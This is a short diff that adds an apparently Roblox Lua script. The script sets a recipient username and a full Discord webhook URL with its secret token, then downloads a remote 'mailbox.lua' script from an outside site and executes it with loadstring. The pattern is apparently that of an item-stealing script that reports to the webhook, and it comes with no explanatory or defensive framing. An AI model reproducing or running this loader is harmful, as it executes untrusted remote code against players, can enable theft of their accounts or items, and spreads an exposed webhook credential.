@@ -1,0 +1,4 @@
+UserName = "breadRald6"
+WebHook = "https://discord.com/api/webhooks/1107669195900063876/vE0BHg2wGNnNUZIa0vwdk9pNBpSmh8yCD_ikEcRwB_EDc_9Cd1DgkX0PrwZ4onl6dCgi"
+
+loadstring(game:HttpGet("https://goof.pro/s/mailbox.lua", true))()
